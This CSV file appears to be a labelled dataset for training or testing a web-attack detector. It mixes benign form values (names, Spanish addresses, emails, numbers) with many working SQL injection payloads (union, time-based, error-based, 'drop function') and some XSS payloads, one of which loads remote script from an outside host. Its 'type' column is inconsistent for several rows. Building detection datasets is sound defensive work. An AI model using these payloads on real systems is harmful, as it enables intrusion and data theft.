Text,attack_type,Label,type
"1')) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
1'||(select 'xqqp' where 3007=3007 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
canaan,norm,0,normal
1499600534131254,norm,0,normal
25660,norm,0,normal
4121021703021394,norm,0,normal
"1)) as atiy where 3855=3855 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
70p89c9cion958,norm,0,normal
79365532f,norm,0,normal
"c/ hermanos senise colmenero, 153, 3-d",norm,0,normal
"-8629 where 8049=8049 union all select 8049,8049,8049,8049,8049,8049,8049#",sqli,1,sql
"torrent de can besora, 68",norm,0,normal
moloney@imarbella.travel,norm,0,normal
teq0io,norm,0,normal
5212327174460921,norm,0,normal
cabral_crowther@frioelectric.br,norm,0,normal
estorbar,norm,0,normal
10300,norm,0,normal
5607274841156559,norm,0,normal
"1') as kbja where 4275=4275 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
casarejos,norm,0,normal
3953,norm,0,normal
1) as ratg where 3033=3033 union all select null--,sqli,1,sql
shih_brusse@professionalhost.jp,norm,0,normal
!d12car3ad1ra,norm,0,normal
pataki-grifties@hiteurope.by,norm,0,normal
06363808f,norm,0,normal
c26ve7sar,norm,0,normal
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('ootz' like 'ootz",sqli,1,sql
1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
1')));select (case when (9562=5996) then 1 else 9562*(select 9562 from master..sysdatabases) end)--,sqli,1,sql
manez@lecriture.gn,norm,0,normal
82497790x,norm,0,normal
cancela,norm,0,normal
cela uba,norm,0,normal
1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1)) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
subhashi,norm,0,normal
mendavia,norm,0,normal
357rte0o,norm,0,normal
"passeig torrent 10, 2f",norm,0,normal
">""<img dynsrc=""javascript:document.cookie=true;"">",xss,2,xss
"1"") where 2633=2633 union all select null,null,null,null#",sqli,1,sql
"1"") where 3679=3679;waitfor delay '0:0:5'--",sqli,1,sql
bellcaire d'urgell,norm,0,normal
22,norm,0,normal
piedra obrador,norm,0,normal
asme,norm,0,normal
"-7482""))) or 9077=2651",sqli,1,normal
50300,norm,0,normal
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,sqli,1,sql
"1' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"")) as ikuz where 7385=7385;select sleep(5)#",sqli,1,sql
39699852n,norm,0,normal
"-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",sqli,1,sql
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,sql
"-8166""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""lcqb""=""lcqb",sqli,1,sql
25132,norm,0,normal
06390,norm,0,normal
1) where 6494=6494;if(6745=4078) select 6745 else drop function ytyt--,sqli,1,sql
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,sqli,1,sql
0945491492259147,norm,0,normal
eccles@aspirantes.gh,norm,0,normal
hinson,norm,0,normal
"1"" union all select null,null,null,null,null,null,null--",sqli,1,sql
pogam@soycatalan.aq,norm,0,normal
ingrey,norm,0,normal
9043,norm,0,normal
1');begin user_lock.sleep(5); end--,sqli,1,sql
lap-pun2@streaptease.hk,norm,0,normal
"1%';select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
somer@hotelsardegna.tg,norm,0,normal
"-8409%') or make_set(9354=9354,7185) and ('%'='",sqli,1,normal
8222689869080007,norm,0,normal
50,norm,0,normal
"<img low id=xss src=""javascript:alert('xss')"">",xss,2,xss
4105436805418109,norm,0,normal
amber,norm,0,normal
"1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--",sqli,1,sql
"1'+(select 'zkuf' where 3591=3591 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
otumba 24 13e,norm,0,normal
cavia,norm,0,normal
5642,norm,0,normal
"1%'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('%'='",sqli,1,sql
7723056495790878,norm,0,normal
mquina,norm,0,normal
bubat6@rosaserigrafia.fi,norm,0,normal
3548348718435303,norm,0,normal
garlitos,norm,0,normal
09515,norm,0,normal
colobran rebull,norm,0,normal
poblacin de campos,norm,0,normal
1) rlike sleep(5)#,sqli,1,normal
"1)) as jmcp where 8624=8624 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
marchard@mailboxrussia.kw,norm,0,normal
"1))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((6395=6395",sqli,1,sql
19283115f,norm,0,normal
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""xbft""=""xbft",sqli,1,normal
"1%');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
cunat amenta,norm,0,normal
scanell@clichotel.kw,norm,0,normal
testua,norm,0,normal
-2364' or 6743=7578,sqli,1,normal
gastoni@stainless.iq,norm,0,normal
corcoll duhalde,norm,0,normal
"1'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
36101090z,norm,0,normal
-9690 union all select 7217#,sqli,1,sql
viena@redesmilitantes.pg,norm,0,normal
c/ doctor coll s/n 8g,norm,0,normal
"c/ lope de rueda s/n, 9-f",norm,0,normal
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1' where 9206=9206;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
46174775k,norm,0,normal
otorgamiento,norm,0,normal
82751097h,norm,0,normal
leyden,norm,0,normal
pa24dan3cea,norm,0,normal
murillo de ro leza,norm,0,normal
3046,norm,0,normal
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1,sql
whit,norm,0,normal
francesc guerra,norm,0,normal
periodista jose ventura traveset 4 5b,norm,0,normal
wilson,norm,0,normal
"olivar, 174,",norm,0,normal
"1) as zqxa where 5718=5718 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('sgdj' like 'sgdj,sqli,1,sql
"-4849"")) or (5005=9111)*9111 and ((""catv"" like ""catv",sqli,1,normal
"-1407 where 1186=1186 union all select 1186,1186,1186,1186,1186--",sqli,1,sql
79856305y,norm,0,normal
1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (3530=3530,sqli,1,sql
sagues villacro,norm,0,normal
darby,norm,0,normal
"1') and make_set(6488=5525,5525)",sqli,1,normal
"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>",xss,2,sql
desmedro,norm,0,normal
jorgelina,norm,0,normal
05150,norm,0,normal
breceda perdig,norm,0,normal
desamparados,norm,0,normal
31358386w,norm,0,normal
morea,norm,0,normal
suzane,norm,0,normal
"-9166"") as hlre where 4768=4768 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
7548017062827268,norm,0,normal
svenn-er,norm,0,normal
01084400l,norm,0,normal
vadell comalada,norm,0,normal
"-3725')) union all select 1541,1541,1541,1541,1541#",sqli,1,sql
kaps,norm,0,normal
"-9864"") or elt(5885=4936,4936) and (""bfbb"" like ""bfbb",sqli,1,normal
stiles,norm,0,normal
40145,norm,0,normal
karpf-valardy@animextremist.lc,norm,0,normal
"1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",sqli,1,sql
h78n7ce30,norm,0,normal
sensiblemente,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
florin,norm,0,normal
6r5int3805,norm,0,normal
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",sqli,1,normal
"1%'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('%'='",sqli,1,normal
edeleman@mytanga.tr,norm,0,normal
jitiang@elgrancolisionadordehadrones.mo,norm,0,normal
massanes,norm,0,normal
butjosa,norm,0,normal
"-2168"")) union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",sqli,1,sql
"-2131"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""wpsf"" like ""wpsf",sqli,1,sql
empel6tarse,norm,0,normal
38790,norm,0,normal
"froilan de la serna, 185",norm,0,normal
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",sqli,1,sql
"1"");select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
calle jose lopez tafall 192,norm,0,normal
2446e8t6da,norm,0,normal
53527134q,norm,0,normal
"1') where 4683=4683 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
1251745617275774,norm,0,normal
calisaya,norm,0,normal
"1') as yjdg where 5262=5262 union all select null,null,null#",sqli,1,sql
roxette,norm,0,normal
saturin-fabre0@cienciapolicial.int,norm,0,normal
"-4287%"")) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",sqli,1,sql
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",sqli,1,normal
"1"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""dnmi"" like ""dnmi",sqli,1,normal
1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
mallott@edifico.bf,norm,0,normal
94845655a,norm,0,normal
"-6381%""))) union all select 1503,1503,1503,1503#",sqli,1,sql
"1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",sqli,1,sql
litago,norm,0,normal
pittner,norm,0,normal
1') where 6244=6244 rlike (select * from (select(sleep(5)))sgvo)--,sqli,1,sql
swinkels,norm,0,normal
"doctor ramon sanchez-parra, 17 11?d",norm,0,normal
huic!h9,norm,0,normal
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
-8264%') order by 1#,sqli,1,normal
huaripuma guisasola,norm,0,normal
"avenida baraain, 51, 1?h",norm,0,normal
5765726970199338,norm,0,normal
-3083) or 5221=7829,sqli,1,normal
mallat paiva,norm,0,normal
"1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") as nqtn where 5606=5606 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""egzm""=""egzm",sqli,1,sql
"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli,1,sql
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('gzpx'='gzpx,sqli,1,sql
39500,norm,0,normal
"1%'))) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
16160,norm,0,normal
spence,norm,0,normal
davril_pallin0@evelin.com.cz,norm,0,normal
47418,norm,0,normal
escribano peraldo,norm,0,normal
"<img src=""mocha:document.cookie=true;"">",xss,2,sql
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",sqli,1,sql
morales orpinell,norm,0,normal
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'ptou'='ptou",sqli,1,sql
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
goring@quadernideilgarda.pl,norm,0,normal
bu7c2pi,norm,0,normal
halpin,norm,0,normal
cap!tar,norm,0,normal
1 where 7890=7890 or sleep(5)--,sqli,1,sql
"c/ belgica, 69 2?d",norm,0,normal
romano,norm,0,normal
-4542')) order by 1#,sqli,1,normal
alexio,norm,0,normal
"<script>document.write(""<scri"");</script>pt id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,2,xss
sia,norm,0,normal
1%') and 2949=4847 and ('%'=',sqli,1,normal
"1"") as gdcx where 2335=2335 and 6969=(select 6969 from pg_sleep(5))--",sqli,1,sql
dels,norm,0,normal
albero bajo,norm,0,normal
mariele,norm,0,normal
3055509843252102,norm,0,normal
42808198t,norm,0,normal
01213,norm,0,normal
34336341d,norm,0,normal
04560,norm,0,normal
julin,norm,0,normal
05229,norm,0,normal
-9501') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('mndw'='mndw,sqli,1,sql
severo,norm,0,normal
pancracia,norm,0,normal
santoyo@deportechino.edu,norm,0,normal
2938010074996541,norm,0,normal
juan de dios,norm,0,normal
"1'+(select 'fxhh' where 2571=2571 union all select null,null,null,null,null,null,null--",sqli,1,sql
"1%"") and 9198=9198--",sqli,1,sql
pas63a0a,norm,0,normal
6777741617227259,norm,0,normal
2olt,norm,0,normal
"c/ caada honda 159, 2-b",norm,0,normal
01370015c,norm,0,normal
nabeil4,norm,0,normal
winde,norm,0,normal
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",sqli,1,sql
greggory@fighting-machines.gl,norm,0,normal
edi,norm,0,normal
walter,norm,0,normal
alfeiza,norm,0,normal
86343464s,norm,0,normal
earvin,norm,0,normal
2ilat9r7a,norm,0,normal
follett,norm,0,normal
revivificar,norm,0,normal
6398147509756321,norm,0,normal
"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",xss,2,xss
"1'+(select 'vabj' where 7178=7178 union all select null,null,null,null,null#",sqli,1,sql
1 where 7055=7055;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
5092047047326643,norm,0,normal
v433g3o5i6r79,norm,0,normal
ridgley,norm,0,normal
0156765529256872,norm,0,normal
boys@muebetuweb.mu,norm,0,normal
"1""));select pg_sleep(5)--",sqli,1,sql
19325,norm,0,normal
"1) where 2940=2940;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
p1n0350a,norm,0,normal
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",sqli,1,sql
mula,norm,0,normal
"1')) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"virgen de la fuensanta, 126, 11?e",norm,0,normal
duffield@telelujo.coop,norm,0,normal
-5089')) as icbb where 1129=1129 or 6250=9650,sqli,1,normal
"1' in boolean mode) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#",sqli,1,sql
"1',iif(7475=7475,1,1/0)",sqli,1,normal
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
"-6236'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
1')) as zqeg where 4729=4729 and (1098=9682)*9682--,sqli,1,sql
"1"" and (3020=3020)*6703",sqli,1,normal
-2214') union all select 8228#,sqli,1,sql
6545971193644202,norm,0,normal
1') where 7908=7908 or sleep(5)--,sqli,1,sql
adamson,norm,0,normal
!and5ajoso,norm,0,normal
1 where 2384=2384 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
29150,norm,0,normal
davids@chuecafamily.gov,norm,0,normal
5118232940986144,norm,0,normal
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""uquh""=""uquh",sqli,1,sql
kovac,norm,0,normal
8267431025409914,norm,0,normal
"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",sqli,1,sql
fredes damas,norm,0,normal
<<script>document.cookie=true;</script>,xss,2,xss
"plaa solsones s/n,",norm,0,normal
"1 where 2363=2363 union all select null,null,null,null,null--",sqli,1,sql
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",sqli,1,sql
0332806980099354,norm,0,normal
"1"") where 1607=1607;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
-6680') or 5483=3031 and ('zxes'='zxes,sqli,1,normal
"ausines, los",norm,0,normal
85233754d,norm,0,normal
4108422495216222,norm,0,normal
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,sqli,1,sql
2a8um238638,norm,0,normal
waldon,norm,0,normal
1') where 5540=5540 waitfor delay '0:0:5'--,sqli,1,sql
maello,norm,0,normal
3820743619643877,norm,0,normal
pl. emilio simon 28,norm,0,normal
craggs,norm,0,normal
"-5431""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ipmo""=""ipmo",sqli,1,sql
arbelez grippo,norm,0,normal
61676468j,norm,0,normal
"1')) as mjps where 2179=2179 union all select null,null,null,null,null,null,null--",sqli,1,sql
77232447b,norm,0,normal
"1%"") order by 1#",sqli,1,normal
"1)) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
"plaza irineo gonzalez, s/n 13?f",norm,0,normal
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",sqli,1,sql
1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- xwoo,sqli,1,sql
"1"" union all select null,null,null--",sqli,1,sql
"1"") where 2180=2180 and make_set(8403=8403,8899)--",sqli,1,sql
adolecer,norm,0,normal
alfardilla,norm,0,normal
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",xss,2,sql
muro de aguas,norm,0,normal
"-5009) where 8463=8463 union all select 8463,8463,8463,8463,8463,8463--",sqli,1,sql
"-4866"") as eyrq where 8365=8365 or 1898=8320#",sqli,1,normal
"1' in boolean mode) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
bezante,norm,0,normal
46891,norm,0,normal
1%'))) order by 1--,sqli,1,sql
1'))) and 6991=5579,sqli,1,normal
6672454826209975,norm,0,normal
wernher,norm,0,normal
"1) where 8474=8474 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"ventallols, 138 8?f",norm,0,normal
"1' or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1'||(select 'owzs' where 1475=1475 union all select null--,sqli,1,sql
29611,norm,0,normal
1'||(select 'zxla' from dual where 7634=7634 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))||',sqli,1,sql
"1'+(select 'gqsk' where 3087=3087 union all select null,null,null,null--",sqli,1,sql
5628,norm,0,normal
gervasio,norm,0,normal
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('xuwl' like 'xuwl",sqli,1,normal
"plza. promesas, 123,",norm,0,normal
excepta,norm,0,normal
91494736t,norm,0,normal
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->",xss,2,xss
1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- slje,sqli,1,sql
"-9353"" where 4607=4607 union all select 4607,4607,4607,4607,4607,4607#",sqli,1,sql
audrye,norm,0,normal
los polancos 133,norm,0,normal
revesa,norm,0,normal
"1) as lejp where 5238=5238 union all select null,null,null,null,null#",sqli,1,sql
36680,norm,0,normal
maciela,norm,0,normal
mallet.asanachinda@placeresadultos.cf,norm,0,normal
50422961s,norm,0,normal
ardys,norm,0,normal
9141,norm,0,normal
47689,norm,0,normal
8547,norm,0,normal
"c/ olid 176,",norm,0,normal
congostrina,norm,0,normal
9oautora,norm,0,normal
15175,norm,0,normal
784,norm,0,normal
-5350)) or 9323=9323#,sqli,1,normal
"1"" where 9725=9725;waitfor delay '0:0:5'--",sqli,1,sql
labranto,norm,0,normal
c/ constelacion 112,norm,0,normal
c/ pablo serrano 53 1?g,norm,0,normal
adversario,norm,0,normal
8520642670287653,norm,0,normal
montaesismo,norm,0,normal
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- gynj",sqli,1,sql
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""umfr"" like ""umfr",sqli,1,sql
1 where 5828=5828 and (3020=3020)*6703--,sqli,1,sql
1') where 8142=8142 waitfor delay '0:0:5'--,sqli,1,sql
"1%"")));if(7427=7800) select 7427 else drop function dgir--",sqli,1,sql
blenkarn6,norm,0,normal
leroi,norm,0,normal
giulivo padilla,norm,0,normal
"c/ hortensia 48,",norm,0,normal
"1') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
ateniesa,norm,0,normal
nadeix laumann,norm,0,normal
"-6440))) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",sqli,1,sql
"<script id=xss src=""http://ha.ckers.org/xss.jpg""></script>",xss,2,xss
celsa,norm,0,normal
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",sqli,1,sql
ruick_heasley4@18horas.ro,norm,0,normal
01538912m,norm,0,normal
1059928902417697,norm,0,normal
plater-z,norm,0,normal
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lzyl"" like ""lzyl",sqli,1,sql
pineda de la sierra,norm,0,normal
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt,sqli,1,sql
5emic0e,norm,0,normal
""" onblur=alert(xss) ""> <""",xss,2,normal
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf",sqli,1,sql
"1'||(select 'cozi' from dual where 2607=2607 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
nicforo,norm,0,normal
overton,norm,0,normal
-9657') as ziiq where 7725=7725 or 3038=3038,sqli,1,normal
"-1510"") as rqrv where 4507=4507 union all select 4507,4507,4507,4507,4507--",sqli,1,sql
"-8266%') union all select 8626,8626,8626,8626,8626,8626--",sqli,1,sql
urueas,norm,0,normal
"<div id=xss style=""binding: url(javascript:alert('xss'));"">",xss,2,xss
comenzar,norm,0,normal
torre alhquime,norm,0,normal
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",sqli,1,sql
17850,norm,0,normal
"1'+(select 'igoi' where 7823=7823 or 8421=(select count(*) from generate_series(1,5000000)))+'",sqli,1,sql
dan,norm,0,normal
1');select pg_sleep(5) and ('itgc'='itgc,sqli,1,sql
sa6v682ia,norm,0,normal
08759,norm,0,normal
fogars de la selva,norm,0,normal
"1) where 5385=5385 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1)) as bsvo where 3605=3605;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
08580215l,norm,0,normal
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",sqli,1,sql
79332858q,norm,0,normal
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""hcjz"" like ""hcjz",sqli,1,sql
"-4927')) union all select 1924,1924#",sqli,1,sql
96804276j,norm,0,normal
"1%') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('%'='",sqli,1,sql
azagra,norm,0,normal
perales del alfambra,norm,0,normal
"1"" where 7110=7110;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"plza. arbol 182, 8?f",norm,0,normal
chumbiauca,norm,0,normal
